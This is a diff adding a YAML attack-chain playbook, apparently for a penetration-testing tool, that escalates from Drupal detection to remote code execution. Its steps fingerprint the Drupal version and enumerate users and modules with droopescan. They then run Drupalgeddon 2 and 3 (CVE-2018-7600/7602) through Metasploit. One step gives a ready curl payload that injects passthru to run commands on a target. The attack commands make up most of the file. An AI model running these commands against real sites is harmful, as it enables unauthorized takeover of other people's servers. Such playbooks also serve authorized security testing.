@@ -1,0 +1,49 @@
+chain_id: drupal_enum_to_rce
+title: "Drupal — droopescan, version pivot, Drupalgeddon if applicable"
+severity: HIGH
+tags: [web, drupal, droopescan, drupalgeddon, rce]
+
+trigger:
+  any_of:
+    - { banner_pattern: "(?i)drupal" }
+    - { path_pattern: "(?i)/(sites/(default|all)/|core/install\\.php|CHANGELOG\\.txt$|misc/drupal\\.js)" }
+    - { path_in: ["/CHANGELOG.txt", "/user/login", "/?q=user", "/core/install.php"] }
+
+description: |
+  Drupal install detected (banner, path, or generator meta). Confirm the
+  exact major version first — Drupal 7 / 8 / 9 / 10 each have very
+  different attack surfaces. droopescan handles enumeration, then pivot
+  to a known CVE for the discovered version (Drupalgeddon 2 / 3 /
+  CVE-2018-7600 against 7-8.5, etc.).
+
+steps:
+  - id: 1
+    title: "Identify the version"
+    command: |
+      curl -s http://$VICTIMA/CHANGELOG.txt | head -1
+      curl -s http://$VICTIMA/core/CHANGELOG.txt | head -1
+      curl -s http://$VICTIMA/ | grep -oE 'Drupal[ /][0-9]+'
+
+  - id: 2
+    title: "Enumerate users / themes / modules"
+    command: droopescan scan drupal -u http://$VICTIMA --enumerate u,p,t
+
+  - id: 3
+    title: "Drupalgeddon 2 (CVE-2018-7600) — Drupal <= 7.58 / 8.3.9 / 8.4.6 / 8.5.1"
+    command: |
+      # Metasploit:
+      msfconsole -qx 'use exploit/unix/webapp/drupal_drupalgeddon2; \
+        set RHOSTS $VICTIMA; set TARGETURI /; run'
+      # Or curl one-shot (Drupal 7):
+      curl -s "http://$VICTIMA/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" \
+        --data 'form_id=user_pass&_triggering_element_name=name'
+
+  - id: 4
+    title: "Drupalgeddon 3 (CVE-2018-7602) — same versions, post-auth"
+    command: |
+      msfconsole -qx 'use exploit/unix/webapp/drupal_drupalgeddon3; \
+        set RHOSTS $VICTIMA; set USERNAME admin; set PASSWORD admin; run'
+
+references:
+  - https://github.com/SamJoan/droopescan
+  - https://www.exploit-db.com/exploits/44449
